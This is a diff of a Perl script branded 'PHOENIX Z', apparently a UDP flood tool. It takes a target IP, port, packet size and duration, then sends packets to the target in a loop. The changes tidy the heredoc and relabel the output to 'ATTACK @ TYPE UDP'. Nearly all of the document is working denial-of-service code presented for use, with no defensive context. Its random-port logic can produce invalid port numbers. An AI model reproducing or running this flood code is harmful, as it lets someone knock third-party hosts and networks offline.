@@ -1,4 +1,4 @@
-﻿#!/usr/bin/perl
+#!/usr/bin/perl
 
 ##
 # PHOENIX Z <----
@@ -21,20 +21,14 @@ print <<EOTEXT;
   / /_/ / /_/ / / / / __/ /  |/ // / |   /      / / 
  / ____/ __  / /_/ / /___/ /|  // / /   |      / /__
 /_/   /_/ /_/\____/_____/_/ |_/___//_/|_|     /____/
-
-
 							Create By PHOENIX Z               .
-
    Command <ip> <port> <Size> <time>.
-   EOTEXT
-
-print "::Get @ Me Random:: $ip " . ($port ? $port : "random") . " Disrespected = " .
-  ($size ? "$size-byte" : "Disconnected :)") . " ~SnowmaN~ " .
+EOTEXT
+print "::ATTACK @ TYPE UDP:: $ip " . ($port ? $port : "random") . " Size = " .
+  ($size ? "$size-byte" : "Size :)") . " PHOENIXZ " .
   ($time ? " for $time seconds" : "") . "\n";
 print "STOP with Ctrl-C\n" unless $time;       # หยุดกด  Ctrl-C
-
 for (;time() <= $endtime;) {
   $psize = $size ? $size : int(rand(1024-64)+64) ;
   $pport = $port ? $port : int(rand(1500000))+1;
-
   send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
